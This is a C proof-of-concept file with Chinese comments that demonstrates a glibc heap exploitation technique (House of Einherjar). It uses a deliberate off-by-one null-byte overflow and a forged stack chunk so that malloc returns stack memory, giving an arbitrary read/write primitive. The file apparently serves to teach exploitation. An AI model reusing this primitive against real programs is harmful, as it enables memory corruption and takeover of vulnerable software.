#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

//这个案例的主要思想是，通过off_by_one漏洞修改下一个chunk的prev_inuse标志位，将该chunk的prev_size通过上一个chunk填入构造好的值，且在栈中构造一个fake chunk,
//使得前面的prev_size的值，和fake chunk的size的值大小一样，才能在合并的时候通过unlink的检查检查。合并后，再次申请一块内存就会从栈上分配内存，达到任意地址读写

//问题：
//此处的prev_size的大小和fake chunk的size大小一样，这样fake chunk的prev_inuse位是会根据fake chunk的位置变化而变化的，也就是说，和并到fake chunk后，再次合并的几率也是有的，
//但下一个合并的chunk的size通常不能匹配。

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	
	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);//此处分配0x38个字节为了能够使用off_by_one漏洞，改变size低字节的标志位
	printf("a: %p\n", a);
   
	int real_a_size = malloc_usable_size(a);//真实分配的大小刚好是0x38，
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

	// create a fake chunk
	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; 
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
	fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize

	b = (uint8_t*) malloc(0x4f8);
	int real_b_size = malloc_usable_size(b);
	printf("\nWe allocate 0x4f8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x500) | prev_inuse = 0x501\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	/* VULNERABILITY */
	a[real_a_size] = 0; //此处位off_by_one漏洞的使用，修改了b的size的低字节位0
	/* VULNERABILITY */
	printf("b.size: %#lx\n", *b_size_ptr);

	
  //当chunk b的prev_inuse标志位被改为0后，就会造成一种歧义，即a没有释放，并且可以对内存操作，而在释放chunk b时，由于标志位位0，unlink时候，会认为b前面的chunk是free状态，可以合并
  //而a可以修改chunk b的prev_size的值，因此，可以在栈上构造一个fake chunk,将其size和b的prev_size一样，这里的大小需要计算好，并且能绕过unlink的检查。
  //大小的计算就是(size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk)，因为chunk b 开始的位置就是(size_t)((b-sizeof(size_t)*2)，计算合并后的chunk头的位置就是
  //(size_t)((b-sizeof(size_t)*2) - [(size_t)((b-sizeof(size_t)*2)-(uint8_t*)fake_chunk)]  = fake_chunk,这样就直接将堆区扩展到了栈区
  
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;//修改chunk b的prev_size

	//Change the fake chunk's size to reflect b's new prev_size
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size;

	// free b and it will consolidate with our fake chunk
  //free b 后就可以将构造好的fake chunk合并到堆中，下一次分配内存就会从构造的fake chunk的位置开始分配。
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b);
	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

	

	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200);
	printf("Next malloc(0x200) is at %p\n", d);

	assert((long)d == (long)&fake_chunk[2]);
}
